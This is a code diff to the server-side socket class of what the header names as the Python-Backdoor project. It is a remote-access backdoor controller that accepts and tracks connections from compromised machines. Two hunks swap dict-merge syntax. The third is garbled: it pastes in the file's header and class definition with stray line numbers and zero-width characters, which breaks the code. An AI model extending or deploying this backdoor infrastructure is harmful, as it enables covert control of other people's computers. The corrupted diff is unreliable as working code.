@@ -66,7 +66,7 @@ class Socket(EncryptedSocket):
                         if response["key"] == CLIENT_HANDSHAKE:
                             break
 
-                    address = {"ip": address[0], "port": address[1]} | response["value"] | {"connected": True}
+                    address = {**{"ip": address[0], "port": address[1]}, **response["value"], **{"connected": True}}
 
                     if self.socket in self.connections:
                         self.addresses[self.connections.index(self.socket)]["connected"] = True
@@ -131,7 +131,7 @@ class Socket(EncryptedSocket):
         # add ID
         for i, address in enumerate(self.addresses):
             if (inactive and not address["connected"]) or (not inactive and address["connected"]):
-                address = {"index": str(i + 1)} | address
+                address = {**{"index": str(i + 1)}, **address}
                 addresses.append(address)
 
         if len(addresses) > 0:
@@ -168,7 +168,95 @@ class Socket(EncryptedSocket):
             self.socket = self.connections[connection_id - 1]
 
             if not self.addresses[connection_id - 1]["connected"]:
-                raise Exception
+                raise Exception"""
+2
+https://github.com/xp4xbox/Python-Backdoor
+3
+​
+4
+@author    xp4xbox
+5
+​
+6
+license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
+7
+"""
+8
+import base64
+9
+import socket
+10
+import sys
+11
+from threading import Thread
+12
+​
+13
+from src import helper, errors
+14
+from src.encrypted_socket import EncryptedSocket
+15
+from src.definitions.commands import *
+16
+​
+17
+​
+18
+class Socket(EncryptedSocket):
+19
+    def __init__(self, port):
+20
+        super().__init__()
+21
+​
+22
+        self.thread_accept = None
+23
+        self.port = port
+24
+        self.connections = []
+25
+        self.addresses = []
+26
+​
+27
+        self.new_key()
+28
+​
+29
+        self.listener = socket.socket()
+30
+        self.socket = None  # socket for a connection
+31
+​
+32
+        try:
+33
+            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
+34
+                                     1)  # reuse a socket even if its recently closed
+35
+        except socket.error as e:
+36
+            self.logger.error(f"Error creating socket {e}")
+37
+            sys.exit(0)
+38
+​
+39
+    def listen_asych(self):
+40
+        def bind():
+41
+            try:
+42
+                self.listener.bind(("0.0.0.0", self.port))
+43
+                self.listener.listen(20)
+44
+            except socket.error() as e:
+45
+                self.logger.warning(f"Error binding socket {e}\nRetrying...")
 
         except Exception:
             raise errors.ServerSocket.InvalidIndex(f"No active connection found with index {connection_id}")
